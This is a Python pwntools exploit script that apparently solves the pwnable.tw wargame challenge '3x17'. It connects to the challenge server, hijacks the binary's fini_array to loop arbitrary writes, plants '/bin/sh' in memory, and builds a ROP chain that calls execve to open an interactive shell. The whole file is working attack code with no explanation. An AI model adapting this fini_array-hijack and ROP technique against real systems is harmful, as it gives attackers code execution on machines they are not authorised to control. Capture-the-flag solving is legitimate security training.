from pwn import *

r = process('./3x17')
# gdb.attach(r,api=True,gdbscript='''
#         #    b*0x401b6d
#         #    b*0x401ba3
#         #    b*0x401c4c
#            ''')

r = remote('chall.pwnable.tw', 10105)

addr = 0x4b40f8
main = 0x401b6d
fnit = 0x402960
pop_rax =  0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
syscall = 0x00000000004022b4
binsh = 0x4b80a0
ret = 0x0000000000401016
pop_rsp = 0x0000000000402ba9

payload = str(addr - 8).encode('utf-8')

r.sendafter(b'addr:', payload)
r.sendafter(b'data:', p64(fnit) + p64(main))
r.sendafter(b'addr:', str(binsh).encode('utf-8'))
r.sendafter(b'data:', b'/bin/sh\x00')
r.sendafter(b'addr:', str(addr + 8).encode('utf-8'))
r.sendafter(b'data:', p64(pop_rax) + p64(0x3b) + p64(pop_rdi))
r.sendafter(b'addr:', str(addr + 32).encode('utf-8'))
r.sendafter(b'data:', p64(binsh) + p64(pop_rsi) + p64(0))
r.sendafter(b'addr:', str(addr + 8*7).encode('utf-8'))
r.sendafter(b'data:', p64(pop_rdx) + p64(0) + p64(syscall))
r.sendafter(b'addr:', payload)
r.sendafter(b'data:', p64(0x0000000000401c4b))

r.interactive()